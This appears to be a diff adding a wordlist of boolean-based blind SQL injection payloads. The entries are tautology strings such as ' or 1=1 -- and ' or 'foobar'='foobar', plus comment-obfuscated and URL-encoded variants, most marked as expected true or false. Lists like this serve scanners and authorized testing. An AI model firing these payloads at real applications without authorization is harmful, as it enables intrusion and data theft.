@@ -1,0 +1,30 @@
+<t>1 AND 5=5</t>
+<f>1 AND 5=0</f>
+<t>"' or 1=1 --</t>
+<t>'" or 1=1 --</t>
+<t>"' or 1=1 /*</t>
+<t>'" or 1=1 /*</t>
+<t>value AND 5=5</t>
+<f>value AND 5=0</f>
+<t>1 OR 5=5 OR 4=0</t>
+<t>1 OR 5=0 OR 4=0</t>
+<t>%27+—+OR+1%3D1-</t>
+<t>value OR 5=5 OR 4=0</t>
+<t>value OR 5=0 OR 4=0</t>
+<f>/**/and/** /0=7659</f>
+<t>/**/or/**/ 7659=7659</t>
+<t>/**/and/**/ 7659=7659</t>
+<t>%27%20—%20OR%201%3D1—</t>
+<t>' or 'foobar'='foobar</t>
+<t>' or 'foobar'='foobar' --</t>
+<t>' or 'foobar'='foobar') --</t>
+<f>' and 'barfoo'='foobar' --</f>
+<f>' and 'barfoo'='foobar</f>
+<f>value' OR 5=0 OR 's'='0</f>
+<t>value' OR 5=5 OR 's'='0</t>
+<f>value' AND 5=5 OR 's'='0</f>
+<f>value' AND 5=0 OR 's'='0</f>
+value' OR
+' and 'foobar'='foobar
+' and 'foobar'='foobar' --
+' and 'foobar'='foobar') --
